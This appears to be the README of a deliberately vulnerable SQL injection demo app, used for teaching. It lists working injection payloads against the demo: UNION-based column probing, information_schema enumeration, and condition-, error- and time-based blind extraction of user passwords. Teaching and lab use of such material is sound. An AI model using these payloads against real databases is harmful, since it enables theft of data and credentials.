# SQL Injection Demo

Application that simulates a search field which is vulnerable to SQL Injection.
It shows the results directly from the database without filtering or validating.

## Example Commands

Below are some examples of commands we can run on this demo to test different SQL injection techniques.

### Test if field is injectable

```sql
'; -- -
```

### Return all entries

```sql
' OR TRUE; -- -
```

### UNION with another table

This example will produce an error if the number of SELECTed properties in the second query is different than the first.

```sql
' UNION SELECT * FROM USERS; -- -
```

We can test how many properties are being selected by attempting to select an increasing number of properties. To help with that, we can select empty strings ('') to increase the property count.

```sql
-- This will produce an error
' UNION SELECT '' FROM USERS; -- -
```

```sql
-- This will produce an error
' UNION SELECT '','' FROM USERS; -- -
```

```sql
-- This will succeed
' UNION SELECT '','','' FROM USERS; -- -
```

### Finding table names

If we don't know the names of any tables on the system, we can query the `information_schema.tables` table. The `table_name` property provides the name of the table and the `table_schema` property provides the name of the database it is part of.

Remember we have to respect the number of properties being selected to match the original query.

```sql
' UNION SELECT table_name, table_schema, '' FROM information_schema.tables; -- -
```

If we know the name of the database, we can query just for the tables on that database.

```sql
' UNION SELECT table_name, table_schema, '' FROM information_schema.tables WHERE table_schema = "DB"; -- -
```

### Finding the name of the database

If we don't know the name of the database, we can use the `database()` function to retrieve the name of the current database.

```sql
' UNION SELECT table_name, table_schema, '' FROM information_schema.tables WHERE table_schema = database(); -- -
```

To list the names of all databases we can query the `information_schema.schemata` table.

```sql
' UNION SELECT schema_name, '', '' FROM information_schema.schemata; -- -
```

Otherwise, we can query the same `information_schema.tables` table as before using the `DISTINCT` keyword.

```sql
' UNION SELECT DISTINCT table_schema, '', '' FROM information_schema.tables; -- -
```

It is worth noting that in this second example we are only getting the names of the databases that contain at least one table.

### Blind Query for Password (Condition-based)

If we manage to get the name of one of the users, we can try to guess their password blindly using conditionals. If the username and password combination is correct, we will see the search results as usual.

```sql
-- This is the correct username/password combination
' AND (SELECT 1 FROM USERS WHERE NAME="user1" AND PASSWORD="password1") = 1; -- -
```

If the combination is wrong, we will get no results.

```sql
-- This is the incorrect username/password combination
' AND (SELECT 1 FROM USERS WHERE NAME="user1" AND PASSWORD="not_password1") = 1; -- -
```

### Blind Query for Password (Error-based)

For our error-based query we will be causing an error by performing a SELECT that will return more than one row. Because we have multiple rows, it is unclear how to perform the conditional `values = 'a'`, causing an error.

```sql
' AND (SELECT CASE WHEN SUBSTRING((SELECT PASSWORD FROM USERS WHERE NAME = 'user1'), 1, 1) > 'g' THEN (select table_name from information_schema.tables) ELSE 'a' END) = 'a'; -- -
```

### Blind Query for Password (Time-based)

```sql
' AND (IF (SUBSTRING((SELECT PASSWORD FROM USERS WHERE NAME = 'user1'), 1, 1) > 'g', SLEEP(1), 'a')) = 'a'; -- -
```
